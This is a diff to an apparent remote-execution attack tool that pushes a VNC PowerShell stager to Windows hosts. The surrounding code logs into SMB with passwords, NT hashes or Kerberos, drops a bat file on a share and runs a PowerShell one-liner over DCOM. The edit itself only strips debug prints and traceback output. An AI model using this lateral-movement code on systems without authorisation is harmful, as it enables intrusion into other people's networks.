@@ -244,10 +244,8 @@ class VNCEXEC:
             logging.info("Connecting to SMB at " + addr)
             self.smbConnection = SMBConnection(addr, addr)
             if self.__doKerberos is False:
-                print 'not kerberos'
                 self.smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
             else:
-                print 'kerberos login'
                 self.smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                             self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
 
@@ -288,8 +286,8 @@ class VNCEXEC:
                 self.smbConnection.deleteFile(self.__share, self.full_file_path)
                 logging.info("File " + self.__share + self.full_file_path + " deleted")
             except  (Exception, KeyboardInterrupt), e:
-                import traceback
-                traceback.print_exc()
+                #import traceback
+                #traceback.print_exc()
                 logging.error(str(e))
                 logging.info("Error on executing bat file. Trying to delete it before exiting")
                 self.smbConnection.deleteFile(self.__share, self.full_file_path)
@@ -313,7 +311,6 @@ class VNCEXEC:
             logging.info("Stager: {0}".format(ps1_line))
             command = str(PSOneliner(ps1_line))
             logging.debug(command)
-            print 'Using kerberos', self.__doKerberos
             dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                   self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
             try:
@@ -330,8 +327,8 @@ class VNCEXEC:
                     pass
                 dcom.disconnect()
             except (Exception, KeyboardInterrupt), e:
-                import traceback
-                traceback.print_exc()
+                #import traceback
+                #traceback.print_exc()
                 logging.error(str(e))
                 logging.critical("Closing DCOM connection")
                 dcom.disconnect()
@@ -654,8 +651,8 @@ def main():
 
 
     except (Exception, KeyboardInterrupt), e:
-        import traceback
-        print traceback.print_exc()
+        #import traceback
+        #print traceback.print_exc()
         logging.error(str(e))
         os.unlink(tempdir + '/' + 'Invoke-Vnc.ps1')
         os.rmdir(tempdir)
